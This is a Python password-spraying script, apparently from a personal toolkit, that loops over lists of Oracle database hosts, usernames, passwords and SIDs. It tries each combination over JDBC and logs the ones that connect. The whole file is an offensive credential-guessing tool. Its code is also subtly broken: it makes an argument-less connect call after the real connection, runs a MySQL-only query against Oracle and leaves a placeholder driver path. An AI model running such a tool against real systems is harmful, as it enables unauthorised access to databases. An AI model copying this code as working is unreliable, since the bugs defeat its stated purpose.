import time
import jaydebeapi
import sys
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.logUtils as logu

import os
import argparse
import sys

parser = argparse.ArgumentParser(description="oracle spray - spraw passwds")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET LIST"',type=str,required=True,help='Target IP or fqdn list file')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')
REQUIRED_ARGUMENTS.add_argument('-s',metavar='"SIDS"',type=str,required=True,help='SIDs list file')


# Argomenti opzionali
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ========================================================================================================



def performConnection(target: str, username: str, password: str, sid: str):

    jdbc_url = f"jdbc:oracle:thin:@{target}:{sid}"
    np.debugPrint(f"JDBC URL: {jdbc_url}")

    jdbc_driver = "OJDBC JAR PATH HERE"

    try:
        conn = jaydebeapi.connect(
                                "oracle.jdbc.driver.OracleDriver",
                                jdbc_url,
                                [username,password],
                                jdbc_driver
                                )

        jaydebeapi.connect()

        curs = conn.cursor()

        curs.execute("show databases;")
        curs.fetchall()

        curs.close()
        conn.close()

        msg = "Target{} --- User: {} --- Password: {} --- SID: {}".format(target,username,password,sid)
        np.infoPrint("Connection succeded: " + msg)

        logu.logInfo(msg)

    except Exception as e:
        np.errorPrint("Connection failed. See exception: below")
        print(e,"\n")
        


if __name__ == '__main__':
    targets = fm.fileToSimpleList(args.t)
    users = fm.fileToSimpleList(args.u)
    passwords = fm.fileToSimpleList(args.p)
    sids = fm.fileToSimpleList(args.s)

    for t in targets:
        for u in users:
            for p in passwords:
                for s in sids:
                    
                    msg = "target {} --- User: {} --- Password: {} --- SID: {}".format(t,u,p,s)
                    np.infoPrint("Testing " + msg)
                    performConnection(t,u,p,s)
                    time.sleep(0.2)